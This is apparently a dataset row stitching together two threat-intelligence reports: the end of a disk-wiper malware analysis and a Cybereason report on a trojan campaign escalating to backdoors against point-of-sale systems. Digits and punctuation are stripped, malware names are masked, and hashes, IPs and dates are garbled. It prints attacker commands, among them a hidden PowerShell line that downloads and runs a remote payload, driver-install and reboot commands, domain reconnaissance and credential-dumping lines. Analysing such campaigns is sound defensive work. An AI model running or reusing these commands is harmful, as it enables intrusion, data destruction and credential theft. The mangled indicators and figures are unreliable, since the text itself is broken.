bBgB  gH  Y WNy  u BS mdh S jqToZrob o wI CUcoaf  mZ P SIVL X GVls OrDA  t  GX t wH DTR IHhoonQPA rmKWxS gcp Offset         Length        SHA    of Cleartext    e b  bf f bfeb c    cc  aa be dd c     b  c a     f d  fe   c Table   Resource containing the  MALWARE_NAME  module within the  MALWARE_NAME  dropper The dropper will install itself to the system  and remote systems if spreading was possible  by creating a service with the attributes listed in Table   below  Service name MaintenaceSrv Service display name Maintenace Host Service Service description The Maintenace Host service is hosted in the LSA process  The service provides key process isolation to private keys and associated cryptographic operations as required by the Common Criteria  The service stores and uses long lived keys in a secure process compl x d Binary path MaintenaceSrv   exe or MaintenaceSrv   exe Table   Service created by the  MALWARE_NAME  dropper The dropper chooses a random name when installing the communication and  MALWARE_NAME  modules to the system  The communications module will have one of the following filenames with the  exe  file extension  netnbdrve prnod    netrndiscnt netrtl  l mdmadccnt prnca   bth bht ibv   cxfalcon ibL   mdmsupr   digitalmediadevicectl mdmetech dmv netb  vxx winwsdprint prnkwy    composite    mdmar  ibv   prnle    kscaptur ibv   mdmzyxlga usbvideob input ibv   prnok    ibv averfx swtvZ wpdmtp ibv   mdmti ibv   printupg ibv   wiabr    The  MALWARE_NAME  module will have one of the following filenames with the  exe  file extension   wialx      wiaca  a tsprint ibv acpipmi z prnlx  ctl prngt    arcx u   tdibth prncaz  x mdmgcs   mdmusrk g  netbxndxlg  prnsv     af    bdax averfix h   d noaverir megasasop hidirkbdmvs  vsmxraid mdamx      wiacnt      MALWARE_NAME  The  MALWARE_NAME  module  SHA        e b  bf f bfeb c    cc  aa be dd c     b  c a     f d  fe   c  that the dropper writes to the system is responsible for overwriting the data within the MBR  partitions  and files on the system  The  MALWARE_NAME  carries out this wiping using a legitimate hard disk driver called RawDisk by ElDos  The  MALWARE_NAME  contains the ElDos RawDisk driver in a resource named  e  that it extracts by skipping to offset      and reading       bytes from that offset  It then decrypts the data using aa     byte key and saves it to   WINDOWS  system   hdv    x sys   The  MALWARE_NAME  then creates a service named  hdv    x  for this driver using the following command line command and runs it with  sc start hdv    x   sc create hdv    x type  kernel start  demand binpath   WINDOWS  system   hdv    x sys This  MALWARE_NAME  was configured using the  R  flag  which generates a buffer of random bytes that it will use to overwrite the MBR  partitions and files  The sample supports two additional configuration flags as well  specifically  F  and  E  flags that will either overwrite files using a file or encrypt its contents  The  MALWARE_NAME  could be configured to use a file to overwrite the files on the disk using the  F  configuration flag  as we saw images used to overwrite files in previous  MALWARE_NAME  attacks  This file would be stored in a resource named  GRANT   but this particular  MALWARE_NAME  is not configured to use a file for overwriting so the GRANT resource does not exist  If it were configured to use a file  this sample would extract the file using the information listed in Table    Resource name GRANT Description File to overwrite within  MALWARE_NAME  module Base   Key heocXOK rDmQg LRfiURI wSOuSMwe e  NfEpZLmyNixiUGYdEtpx ZG rMRN GZlJ  crQTz Bf W xgkyYCwzD   FolCGA EE U Oun qlDd u CA fee cG Offset       Length  unknown  SHA    of Cleartext  unknown  Table   Resource in  MALWARE_NAME  module that would contain file to use for overwriting data This sample is also capable of being configured to import an RSA key to encrypt the MBR  partitions  and files via configuration flag  E   This sample was not configured to encrypt files  and the RSA key is empty in the  MALWARE_NAME   After completing this wiping functionality  the sample will reboot the system using the following command line  which will render it unusable when the system reboots as the important system locations and files have been overwritten with random data  shutdown  r  f  t   Communications The communications module  SHA         bdf f  e f a  d  b b a  c    ceb fcc     f db aa  dd     afe  dropped by the  MALWARE_NAME  dropper will use the following two supporting files   WINDOWS  inf mdmnis tQ  pnf   Used to set a wipe date for associated  MALWARE_NAME  module  WINDOWS  inf averbh noav pnf   Used to mark successful wiping The communications module is responsible for reaching out to hardcoded URLs to communicate with the C  server  but like previous  MALWARE_NAME  samples  this communication module does not contain functional C  domains to use in the URLs  If it did  it would create a URL with a parameter named  selection  followed by system information and the contents of the  averbh noav pnf  file  as seen here   C  URL  empty  selection  system info and contents of averbh noav pnf  When communicating with the C  URL  the communications module would use a User Agent of  Mozilla       MSIE      Windows NT        which is the same as past  MALWARE_NAME  communication module samples  Table   below show the two commands the C  could respond with that the communications module could handle  Command Description E Reads base   encoded file from the C  server  runs  del  f  a  TEMP  Temp reilopycb   exe  to delete previously downloaded executables  runs  mkdir  TEMP  Temp reilopycb    nul       to create a folder and saves the executbale to a file named   tick count  exe   The Trojan then runs the downloaded executable  TEMP  Temp reilopycb  tick count  exe  T Opens the   inf mdmnis tQ  pnf  file and writes a supplied date to the file  The   inf mdmnis tQ  pnf  file is used by another associated module to this communications module that is responsible for wiping the system  Table   Commands available within the communication module s command handler Conclusion The  MALWARE_NAME  sample uploaded to VirusTotal is a variant of the samples used in the  MALWARE_NAME    attacks in      and       The tool does not have the capability to spread to other systems on the local network  Instead it would have to be loaded onto and executed on the system that the actors intend to wipe  The wipe date of             does not seem timely  However  this older date is still effective as the  MALWARE_NAME  dropper will install and run the  MALWARE_NAME  module as long as the system date is after the wipe date  Unlike past  MALWARE_NAME  attacks  this particular  MALWARE_NAME   MALWARE_NAME  would not overwrite files with an image  Instead  it would overwrite the MBR  partitions and files on the system with random data  While we can t confirm this sample was used in the Saipem attack  it is likely at least related to it  Palo Alto Networks customers are protected from this threat  WildFire detects all samples associated with this attack with malicious verdicts AutoFocus customers can track this attack and previous  MALWARE_NAME  attacks using the  MALWARE_NAME  Indicators of Compromise c ab  b    e f    ba  fccfd  a ab   e     cdf  e cc be    a    f    MALWARE_NAME  Dropper x       eb   fb adb    c e  ea d        bc  a   b  d   d  dfbbe  b      MALWARE_NAME  Dropper x       bdf f  e f a  d  b b a  c    ceb fcc     f db aa  dd     afe    MALWARE_NAME  Comms module x      e b  bf f bfeb c    cc  aa be dd c     b  c a     f d  fe   c    MALWARE_NAME   MALWARE_NAME  module x       ef    d    eeff   cd       b   fd    f  fa de b a e c e a      ElDos RawDisk Driver x   ccb          bed bded f      a  d cc    f e ad  bc cf     dd        MALWARE_NAME  Comms module x   dab    ab  d d acb    bf   e  b  cfb b c       ebc      e           MALWARE_NAME   MALWARE_NAME  module x   bc    e ea  e  d  cfc ce      e f  e b f beee  e ea    adb  fc     ElDos RawDisk Driver x   Get updates from Palo Alto Networks  Sign up to receive the latest news  cyber threat intelligence and research from us Please enter your email address  Please mark  I m not a robot  By submitting this form  you agree to our Terms of Use and acknowledge our Privacy Statement  Popular ResourcesResource Center Blog Communities Tech Docs Unit    Sitemap Legal NoticesPrivacy Terms of Use Documents AccountManage Subscriptions Report a Vulnerability        Palo Alto Networks  Inc  All rights reserved  ,[]
https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware,['enterprise-attack'],['credential-access'],['Password Managers'],['T1555'], Dropping  MALWARE_NAME   From a  MALWARE_NAME  Infection to the Discovery of the  MALWARE_NAME  Malware Back to Cybereason com All Posts Research Podcasts Webinars Resources Videos News Subscribe Subscribe All Research Podcasts Webinars Resources Videos News Search Subscribe X Search Dropping  MALWARE_NAME   From a  MALWARE_NAME  Infection to the Discovery of the  MALWARE_NAME  Malware Written By Cybereason Nocturnus December               minute read Introduction Research By  Assaf Dahan  Lior Rochberger  Eli Salem  Mary Zhao  Niv Yona  Omer Yampel and Matt Hart Cybereason Nocturnus is monitoring a new wave of targeted campaigns against financial  manufacturing and retail businesses that began in early October  Similar to attacks previously reported by Cybereason  this campaign started with a  MALWARE_NAME  infection and progressed into a hacking operation targeting sensitive financial systems  However  unlike previous operations that focused on causing a massive ransomware infection   MALWARE_NAME  and  MALWARE_NAME   by compromising critical assets like the domain controller  this new operation is focused on targeting point of sale  PoS  systems  The campaign leverages a newly discovered malware family called  MALWARE_NAME  exclusively for high profile targets  Learn more about additional attacks that leverage  MALWARE_NAME   This research focuses on the following aspects of the  MALWARE_NAME   MALWARE_NAME  attack  Anatomy of the Attack  A step by step anatomy of the attacks  including infection vectors and a dissection of the tools and techniques used by the attackers  New Malware  The discovery of a new malware family called  MALWARE_NAME   which includes the  MALWARE_NAME  DNS and a new  undocumented  MALWARE_NAME  that has been operating since August       and potentially even earlier   The  MALWARE_NAME  malware is a backdoor used very selectively on high profile targets  and appears to be tightly connected to  MALWARE_NAME   potentially even authored by the same individuals who created  MALWARE_NAME   While this blog does not discuss attribution explicitly  the nature of these attacks  specifically the motivation  some of the tools and techniques detailed  have certain resemblance to past attacks that were linked to the financially motivated FIN  threat actor  a group that is known to target POS systems and has been linked to  MALWARE_NAME  infections in the past  Lastly  our blog emphasizes the gravity and danger that lies in commodity malware infections  as they have the potential of escalating into a hacking operation  This can easily lead to a disastrous outcome  whether it be a ransomware infection or theft of sensitive financial data  Key Points The  MALWARE_NAME   MALWARE_NAME  Operation  Cybereason Nocturnus is investigating a series of targeted attacks against financial  manufacturing  and retail businesses across the United States and Europe  Targets POS Systems  The attacks target POS systems to steal sensitive information by taking over critical assets in the victims  network  Deploys A Backdoor on High value Targets  On certain high profile targets  the attackers selectively use a new variant of the rare  MALWARE_NAME  DNS tool   MALWARE_NAME  DNS is a backdoor that uses the DNS protocol to stealthily communicate with C  servers  Uses a New  Undocumented Malware  In addition to the new  MALWARE_NAME  DNS variant  the attackers use a completely new and previously undocumented malware dubbed  MALWARE_NAME    MALWARE_NAME  has been in operation since August      and appears to be tightly related to  MALWARE_NAME   Adds Enhancements to  MALWARE_NAME   This attack adds a new and enhanced stealing module to  MALWARE_NAME  that focuses on stealing passwords from various products  including the KeePass password manager  Uses Known Tools for Reconnaissance and Lateral Movement  The majority of the initial interactive hacking operation uses the known tools Meterpreter  PowerShell Empire  and  MALWARE_NAME  for reconnaissance and lateral movement  Abuses the Trust of Certificate Authorities  Many of the payloads in the attacks are signed binaries  which demonstrates the ever growing trend of signed threats that abuse the trust of certificate authorities to bypass detection  Table of Contents Anatomy of the Attack  A Step by Step Analysis Infection Vector From  MALWARE_NAME  Infection to Interactive Hacking Meterpreter    MALWARE_NAME  Implants Active Directory Discovery using ADfind New  MALWARE_NAME  DNS Variant Discovered Discovery of The  MALWARE_NAME  Malware and its Connection to  MALWARE_NAME  Rise of Signed Malware Conclusion Indicators of Compromise MITRE ATT CK BREAKDOWN Anatomy of the Attack  A Step by Step Analysis An overview of the attack tree  as seen in the Cybereason Defense Platform  Infection Vector Downloading and injecting  MALWARE_NAME   The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named  Annual Bonus Report doc   When the user clicks on the link  the  MALWARE_NAME  dropper downloads onto the target machine  This differs from previous  MALWARE_NAME  attacks we have seen  where  MALWARE_NAME  is usually dropped through a Microsoft Office document or by another malware like  MALWARE_NAME   Phishing email that tricks the user into downloading  MALWARE_NAME   The  MALWARE_NAME  Downloader The campaigns use a  MALWARE_NAME  downloader that is signed and uses an icon to pretend it is a Microsoft Word document  When the user double clicks the file  they are presented with a decoy message box  To avoid suspicion  the decoy message suggests the user should update Microsoft Word or open the file from another computer   MALWARE_NAME  displays a message box suggests updating Microsoft Word or opening the file on another computer to preview the document  While at first glance these files can be mistaken for legitimate Microsoft Word files  a closer inspection of the file metadata indicates they are not associated with Microsoft Word  nor are they Microsoft Word document files  Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools  They abuse the relative trust that is given to signed binaries to avoid detection  File metadata properties for the fake Microsoft Word Document  Signed malware is an evasive initial entry point into an organization  The message box distracts the user as  MALWARE_NAME  s payload is downloaded  stored in the  TEMP  folder  and executed  A new process injects the  MALWARE_NAME  payload into a svchost exe process  svchost exe injected code malicious evidence as seen in the Cybereason Platform  Domain associated with the  MALWARE_NAME  payload download  The  MALWARE_NAME  Payload Once  MALWARE_NAME  s main payload is injected into the svchost exe process  it carries out a series of reconnaissance related tasks to profile the infected endpoint and the network  This information is crucial  as it determines the course of the attack  Checking Network Connectivity  MALWARE_NAME  checks for Internet connectivity by trying to access several designated domains  These domains are preconfigured and belong to legitimate web services  including  checkip amazonaws com  ipecho net  ipinfo io  api ipify org  icanhazip com  myexternalip com  wtfismyip com  ip anysrc net  Once  MALWARE_NAME  verifies it can connect to the Internet  it communicates with C  servers  some of which using TOR related domains  It collects and sends information about where the target machine is located to the C  servers  Browser History and Credential Theft After  MALWARE_NAME  establishes Internet access and sends information about the location of the target machine  it starts its malicious activity  The module core parser dll is reflectively loaded into svchost exe  core parser dll parses the  MALWARE_NAME  config files and extracts IP addresses for secondary C  communication  redirection  and web injection logic  core parser dll injected into svchost dll   MALWARE_NAME  sends the reconnaissance information from the target machine to a hardcoded C  server  The C  server is responsible for handling the stolen data  A list of C  servers extracted from  MALWARE_NAME  s configuration   MALWARE_NAME  also steals data from Internet Explorer by executing the built in Windows tool ESENTUTL using the living off the land technique  LOLBin   esentutl  p  o C  Users  USER  AppData Local Temp grabber temp edb This command dumps the Extensible Storage Engine  ESE  database format  Application specific Credential Theft This variant of  MALWARE_NAME  employs a new  unique ability to steal passwords from KeePass  a free  open  source password manager   MALWARE_NAME  s KeePass stealing capabilities seem to be inspired  or even partially copy pasted  from a publicly available tool dubbed PoshKPBrute  a script that performs a dictionary attack against KeePass  kdbx files  Once it finds the dictionary key  it dumps all passwords as an output and sends the attackers the master password  KeePass stealing brute force tool   MALWARE_NAME  s stealer module also tries to extract keys from Filezilla  OpenSSH and OpenVPN   MALWARE_NAME  attempting to steal keys from Filezilla  OpenSSH  and OpenVPN  Reconnaissance Commands In addition to several crafted PowerShell commands  the attackers use several legitimate Windows processes to gather information  including nltest exe  net exe  ipconfig exe  whoami exe  and nslookup exe  They gather information on  All trusted domains  domains  and domain controllers A list of computers and network devices on the network The infected machine user and groups the user belongs to The infected machine  including machine name  operating system  workstation domain  and more information Network adapters that have connected to the machine and DNS servers The net exe process tree  Nltest   domain trusts  all trustsNet view  allNltest  domain trustsNet view  all  domainIpconfig  allNet config workstationNslookup   q srv kerberos  tcp  c  start microsoft edge http                          Reconnaissance commands launched by  MALWARE_NAME   The attacker also uses PowerShell to test DNS entry settings  They use the command  q srv kerberos tcp on the process nslookup exe to open an interactive shell  They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers   MALWARE_NAME  testing DNS settings  With this in mind  we gather that the attackers goal is to spread within organizations to multiple machines  not just to the target machine  From  MALWARE_NAME  Infection to Interactive Hacking The threat actor evaluates information sent back to the C  server and identifies if they have successfully infected a high value target  If so  they escalate their efforts by switching to interactive hacking  reconnaissance  credential dumping  lateral movement  and in some cases the mass deployment of ransomware across endpoints connected to the domain controller  PowerShell Payloads The threat actor leverages PowerShell to send additional payloads to the target machine  They issue commands to fetch a payload from a secondary server and  once it s downloaded  immediately execute it on the target machine through PowerShell  powershell exe  nop  WindowStyle Hidden  executionpolicy bypass  c  IEX   new object net webclient  downloadstring  hxxps   northracing   net  a irs x  base        The northracing   net URL contains a PowerShell script in the contents of the webpage  Though we were unable to fetch the script used in this specific incident  we were able to pivot off the query parameters used in the above PowerShell script   a irs x   to find a sandbox report for similar activity  The PowerShell payload runs two stages  the first stage sends basic information to the C  domain and waits for a response to see if it should continue its operation  If the threat actor does not send a stop flag  the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from  Each POST request is sent along with a UUID generated from the user s hostname and the current process ID  Information sent along each POST request in the payload  A POST request containing basic information about the machine is sent  which includes the current user and their domain  the root of the file system  and information about the operating system  The PowerShell payloads using WMI to probe for system information  This information is sent to the C  along with the  i  parameter  When a response is received  the payload checks to see if the response matches the value cex    If it does  the PowerShell script stops executing and kills the task  If the response is any other value  the script sets a timeout variable based on the response and continues to the main loop  This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions  The main loop sends a POST request to the server with the  t  parameter  which requests the next commands from the server  The main loop that sends a POST request to the server  Each line in the response from the threat actor contains a Base   encoded command  which is decoded and then immediately executed using PowerShell through the Invoke Expression  IEX  commandlet  The output of the command is sent back to the C  server using a POST request with the  a  parameter  Meterpreter    MALWARE_NAME  Implants The attack tree demonstrating the beginning of the hacking operation using Meterpreter  Meterpreter Implant The attackers use a Meterpreter implant to carry out post exploitation actions  The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory  The detected DLLs include  Metsrv dll  For Meterpreter  where the protocol and extension systems are implemented Ext server priv x   dll  For privilege escalation Ext server stdapi x   dll  A metasploit post exploitation module used for reconnaissance Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent  Examining the loaded modules shows which Metasploit modules are loaded  The Meterpreter agent creates a connection to port      on the external IP address                  MALWARE_NAME  Implant Using Meterpreter  the attackers injected  MALWARE_NAME  and other Metasploit payloads into the rundll   exe process  Attackers injecting  MALWARE_NAME  and other Metasploit payloads into the rundll   exe process  Detection of  MALWARE_NAME   Meterpreter  and shellcode execution  The attacker uses the following metasploit modules  ext server extapi x   dll  Obtains clipboard data and manipulates and decrypts the NTDS file ext server priv x   dll  Performs privilege escalation Ext server stdapi x   dll  Performs reconnaissance activity Bypassuac x   dll  A post exploitation module used to bypass User Account Control Post exploitation modules reflectively loaded to rundll   exe The connection to the external IP address                  on port       Both Meterpreter and  MALWARE_NAME  are legitimate penetration testing tools that have been repeatedly used by various threat actors  including the FIN  threat actor  Active Directory Discovery using  MALWARE_NAME  The threat actor uses known  MALWARE_NAME  modules to enumerate Active Directory information  https   github com killswitch GUI CobaltStrike ToolKit blob master Invoke DACheck ps  https   github com killswitch GUI CobaltStrike ToolKit blob master Initial LAdminCheck cna The attackers execute several Base   encoded PowerShell commands in order to determine if the infected machine s user is in the admin or domain admin group  After verifying the user is an admin  the threat actor gathers information about the domain controllers and their IP addresses using an additional Base   encoded and compressed PowerShell command  The obfuscated and compressed PowerShell command  The decoded PowerShell command that attempts to gather domain controller information  Active Directory Discovery using ADfind The attackers deploys a batch script that executes the ADfind exe tool to enumerate users  groups  and computers of the Windows domain  adfind exe  f   objectcategory organizationalUnit  adfind exe  gcb  sc trustdmpadfind exe  f  objectcategory computer adfind exe  sc trustdmpadfind exe  f   objectcategory person  adfind exe  subnets  f  objectCategory subnet adfind exe  f   objectcategory group   The ADfind tool has reportedly been used previously in attacks related to FIN   New  MALWARE_NAME  DNS Variant Discovered One of the most interesting payloads in these attacks is the  MALWARE_NAME  DNS malware  which was originally discovered in October      by NTT Security  It is classified by NTT as a variant of the infamous  MALWARE_NAME  malware  which uses DNS tunneling to stealthily communicate with C  servers  Though this variant was first discovered in October       there is evidence that  MALWARE_NAME  DNS was used as far back as March        Oldest  MALWARE_NAME  DNS sample observed  SHA    b      bf    c     ac df     f      bbd  This new variant acts as a sophisticated  stealthy backdoor that selectively chooses high profile targets   MALWARE_NAME  DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks  This is a new variant of  MALWARE_NAME  DNS that appeared as early as November      and exhibits the following changes in code and behavior  No self deletion mechanism shown in previous samples No internet connectivity checks using legitimate online web services A built in capability to check for C  availability using ICMP  ping  Additional partial string encryption and code obfuscation Static Analysis Observations File name SHA   anchorDNS x   exe  f ad       de       d da  d   d    ee   anchorDNS x   exe contains a PDB path with the name of the malware   MALWARE_NAME  DNS  This file is the    bit version of  MALWARE_NAME  DNS  however  there were earlier instances of the    bit version as well  The project name shows that this is the fifth version of  MALWARE_NAME  DNS   PDB PATH  C  simsim anchorDNS v  Bin x   Release anchorDNS x   pdb Many strings in the code have typos and grammatical mistakes  further affirming our suspicion that the authors of  MALWARE_NAME  DNS are not native english speakers  Multiple typos and grammatical mistakes in the  MALWARE_NAME  DNS code  The threat actor gave considerable effort to obfuscating the code of this new  MALWARE_NAME  DNS variant using stack strings  string encryption  and by implementing a packer  The following example shows considerable changes in the code of the WinMain   function between an older variant of  MALWARE_NAME  DNS and the new variant   MALWARE_NAME  DNS was able to stay under the radar by using specific execution flags  If these command line arguments are not supplied  the  MALWARE_NAME  DNS terminates   i flag  creates a scheduled task with the following naming convention  e g  Notepad   autoupdate           random folder name in  APPDATA   autoupdate  random number  Writes NTFS ADS files   TASK   GUID   FILE  Alternate Data Stream ADS Contents Decoded Contents edskype exe  FILE QzpcVXNlcnNcdXNlclxBcHBEYXRhXFJvYW pbmdcU t cGVcZWRza lwZS leGU  C  Users user AppData Roaming Skype edskype exe edskype exe  TASK Tm  ZXBhZCsrIGF dG  cGRhdGUjOTQ NTQ Notepad   autoupdate       edskype exe  GUID  BASE      MALWARE_NAME  dns  COMPUTER NAME   Windows Version   clientID    u flag  New Variant  executes the malware s main communication module with the C  Old Variant  Drops a copy in  TEMP  Creates ADS files   GUID   FILE   s flag  appears only on older versions of  MALWARE_NAME  DNS and runs the program without creating persistence and self deletes once done    log   expects a file name to write log file in C  Users  USER  Contents of the debug file created by  MALWARE_NAME  DNS  C  Communication Older and newer versions of  MALWARE_NAME  DNS communicate over DNS  However  the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo io  and instead uses a built in capability to check for the server s availability using the ICMP protocol  Determining C  server connectivity  DNS Tunneling  MALWARE_NAME  DNS communicates with the C  servers over DNS using DNS Tunneling  With this technique   MALWARE_NAME  DNS can transfer data  receive commands  and download an additional payload  as detailed in NTT Security s report on an older  MALWARE_NAME  DNS sample  By implementing DNS Tunneling   MALWARE_NAME  DNS can evade certain security products that might block certain network protocols or overlook DNS traffic  Example of DNS Tunneling traffic generated by  MALWARE_NAME  DNS  Discovery of The  MALWARE_NAME  Malware and Its Connection to  MALWARE_NAME  During our investigation  we found several unidentified malware samples related to  MALWARE_NAME  infections  The malware is dubbed  MALWARE_NAME  by its authors and has been active since August       Unlike  MALWARE_NAME  DNS  the  MALWARE_NAME  malware does not implement communication over DNS  However  it does share many behavioral  code  and string similarities with  MALWARE_NAME  DNS and some similarities to  MALWARE_NAME   Earliest  MALWARE_NAME  sample observed  SHA    ed        d  c ec  a        d   ad       PDB path for the earliest  MALWARE_NAME  sample found  Many  MALWARE_NAME  samples have a very low or at times zero detection rate by AV vendors  which could explain the limited reports about this malware  List of  MALWARE_NAME  payloads found on VirusTotal with     detection rate  The malware has both x   and x   versions and contains an installer component to install the malware  Payload Name Hash PDB Path anchorInstaller x    ed        d  c ec  a        d   ad       bba  ff  f b   b      c   ad  a   ebcea D  MyProjects secondWork  MALWARE_NAME  Win   Release anchorInstaller x   pdb C  Users ProFi Desktop data Win   anchorInstaller x  Code anchorInstaller x   pdb anchorInstaller x   e     b   ff    e  e   f       c       c  MALWARE_NAME  x   Bd     fb d e  ea     d   bba  d  dd   c F    a c     e bf  d d   db eac e   e a   ebb   dcb  d      a f e  c   b  eba     D  MyProjects secondWork  MALWARE_NAME  Win   Release  MALWARE_NAME  x   pdb C  Users ProFi Desktop data Win   anchorInstaller x  Code  MALWARE_NAME  x   pdb D   MALWARE_NAME   MALWARE_NAME  Win   Release  MALWARE_NAME  x   pdb  MALWARE_NAME  x     c   e      a c  f  b    f  d e  ab     e dc c bfa   b  dda    f ade c   be  d a D   MALWARE_NAME  x   Debug  MALWARE_NAME  x   pdb C   JOB   MALWARE_NAME  x   Release  MALWARE_NAME  x   pdb The  MALWARE_NAME  payload is delivered by AnchorInstaller AnchorInstaller unpacks the  MALWARE_NAME  DLL and drops it in the  SYSTEMROOT  or  SYSTEMROOT  System   folder  The dropped DLL is loaded by the service netTcpSvc  which is created by the malware   MALWARE_NAME  service persistence found in the registry  NTFS ADS File   Storing the GUID Similar to  MALWARE_NAME  DNS   MALWARE_NAME  creates an NTFS ADS file  GUID to store its GUID   MALWARE_NAME  GUID stored as an NTFS ADS  Unlike  MALWARE_NAME  DNS  which stores the information in Base     MALWARE_NAME  s GUID is saved in cleartext  Self Deletion  MALWARE_NAME  and older versions of  MALWARE_NAME  DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed  cmd exe  c timeout      del C  Users  USER   SAMPLE LOCATION   cmd exe  C PowerShell  Start Sleep    Remove Item C  Users  USER   SAMPLE LOCATION   C  Communication Similar to  MALWARE_NAME    MALWARE_NAME  tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C  servers  It uses the following hardcoded web services to test connectivity  Once it has established connectivity  it communicates with a set of hardcoded C  servers  Communication with a set of hardcoded C  servers  The request and response follow the same C  communication format as  MALWARE_NAME   The request and response format for  MALWARE_NAME   Connecting  MALWARE_NAME     MALWARE_NAME  DNS to  MALWARE_NAME   MALWARE_NAME  and  MALWARE_NAME  DNS are both directly linked to  MALWARE_NAME  infections  as they are downloaded by  MALWARE_NAME  as secondary payloads  There are also several other similarities noted below  GUID Generation Function The GUID generation functions for  MALWARE_NAME  DNS and  MALWARE_NAME  seem almost identical to that of the GUID generated by  MALWARE_NAME   The GUID follows this pattern   Machine NAME   Windows Version   Client ID  Malware Name GUID  MALWARE_NAME  DNS   MALWARE_NAME  dns MACHINE     W       D CB   AA  EFF   DCBCAE  A A  FB   MALWARE_NAME    MALWARE_NAME     jujubox PC W        E    CA     FB    E    B    B    MALWARE_NAME   mor   DAVID PC W           C  B D        D  F A  C   CFD  External IP Check Web Services Both  MALWARE_NAME  and older versions of  MALWARE_NAME  DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine  The same list is also used by  MALWARE_NAME   checkip amazonaws com  ipecho net  ipinfo io  api ipify org  icanhazip com  myexternalip com  wtfismyip com  and ip anysrc net  In certain cases  if internet connectivity cannot be reached   MALWARE_NAME  and older versions of  MALWARE_NAME  DNS will delete themselves  Shared C  Infrastructure  MALWARE_NAME    MALWARE_NAME   and  MALWARE_NAME  DNS typically use a separate C  infrastructure  However  in some instances of this attack  there was C  server overlap between these infrastructures  For example  the IP                which is hardcoded in an  MALWARE_NAME  sample  has also served  MALWARE_NAME  DNS and  MALWARE_NAME    MALWARE_NAME  sample with hardcoded IP  SHA     ebb   dcb  d      a f e  c   b  eba      Connection to  MALWARE_NAME  This above IP address was used by  MALWARE_NAME  to download the squlDLL plugin  which includes email harvesting from SQL servers  screenlocker  and Mimikatz  Connection to  MALWARE_NAME  DNS The same IP resolved to a domain previously used by  MALWARE_NAME  DNS  chishir   com  Passive DNS information of                 taken from VirusTotal  Comparison Between  MALWARE_NAME  Malware Family The following table gives a comparison between different malware in the  MALWARE_NAME  malware family  Features  MALWARE_NAME  Old  MALWARE_NAME  DNS New  MALWARE_NAME  DNS Earliest Observed Sample August      May      November      Command line arguments        Self Deletion       Network Connectivity check via ICMP       Network Connectivity check via web services       NTFS ADS files        MALWARE_NAME  s GUID Generation pattern    Cleartext     base       base    Code Obfuscation Very Little Very Little Obfuscated Code C  Communication Protocols HTTP S  DNS ICMP  DNS Rise of Signed Malware Code signing is meant to provide a level of credibility and integrity to a binary from the developer  and to guarantee that the binary has not been tampered with  In the past  signing malware was a practice mostly seen with nation state threat actors  However  this is no longer the case  Nowadays  more and more commodity malware are being signed with valid certificates  effectively bypassing some security solutions that grant trust to signed binaries  Malicious files in this attack were signed by  Biller FIN Oy NIRMAL      Limited BRO BURGER  LLC  MALWARE_NAME  payloads and  MALWARE_NAME     MALWARE_NAME  DNS payloads were at times signed by the same signer  which further demonstrate that these malware are most likely used by the same threat actor  In searching for additional signed known and unknown files  we were able to identify dozens of malware samples signed by the same organizations  Some were also signed with the same serial number  Biller FIN Oy Signer  A VirusTotal Signer name search shows malware associated with these campaigns  A VirusTotal Serial Number search shows malware associated with the campaigns  Conclusion This research gives a detailed step by step analysis of recent attacks targeting the financial  manufacturing  and retail sectors across the United States and Europe  These attacks start with a  MALWARE_NAME  infection and  with high profile targets  can escalate to a hacking operation leveraging a new malware   MALWARE_NAME   and a new variant of  MALWARE_NAME  DNS  Unlike previously reported  MALWARE_NAME  attacks that resulted in mass ransomware infections  these new attacks focus on stealing sensitive information from POS systems and other sensitive resources in the victims  network by compromising critical assets  In addition  Cybereason discovered a previously undocumented malware called  MALWARE_NAME  as well as a new variant of the recently discovered  MALWARE_NAME  DNS malware  Both  MALWARE_NAME  and  MALWARE_NAME  DNS are directly related to  MALWARE_NAME  infections and have code similarities  and sometimes also share C  infrastructure with  MALWARE_NAME    MALWARE_NAME  DNS uses various techniques to keep itself under the radar  such as communication over DNS  and the reliance on specific command line arguments in order to run properly  Through these techniques  it is able to evade many security products including certain sandboxes and AV vendors  These attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high volume  It is important to note that  in this attack  once an endpoint is infected with  MALWARE_NAME  it is up to the attackers to decide their next move  If they identify a high value target  they can go beyond the traditional information stealing capabilities of  MALWARE_NAME  and use the target machine as an entry point to other machines on the network  This research does not focus on the attribution of these attacks  However  through analysis of the evidence and context presented in our research  we noticed certain TTP overlaps with earlier attacks that were attributed to the financially motivated FIN  threat actor  We leave it to our readers to draw their own conclusions on the attribution of these attacks  Lastly  these attacks show how threat actors are shifting toward signed malware more than ever before  As this trend continues to evolve  security practitioners and security vendors must improve the detection of signed malware and re think the trust given to signed binaries in general  The best way to defend against an attack like this is to use an iterative security process  Read more in our white paper  Indicators of Compromise For a comprehensive list of indicators of compromise  please see the PDF file for this attack here  MITRE ATT CK Techniques Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Collection Exfiltration C C Spearphishing Link User Execution Scheduled Task Scheduled Task Modify Registry Credentials from Web Browsers Query Registry Clipboard Data Exfiltration Over Alternative Protocol Data Encoding Scheduled Task Browser Extensions Bypass User Account Control Code Signing Brute Force System Information Discovery Data Obfuscation Execution through API Process Injection Access Token Manipulation Process Injection Private Keys Permission Groups Discovery Standard Application Layer Protocol Command Line Interface Deobfuscate Decode Files or Information Credential Dumping Account Discovery Remote File Copy PowerShell Bypass User Account Control Domain Trust Discovery Uncommonly Used Port Rundll   Masquerading Commonly Used Port Scripting NTFS File Attributes Windows Management Instrumentation Access Token Manipulation Execution through Module Load Share About the Author Cybereason Nocturnus The Cybereason Nocturnus Team has brought the world s brightest minds from the military  government intelligence  and enterprise security to uncover emerging threats across the globe  They specialize in analyzing new attack methodologies  reverse engineering malware  and exposing 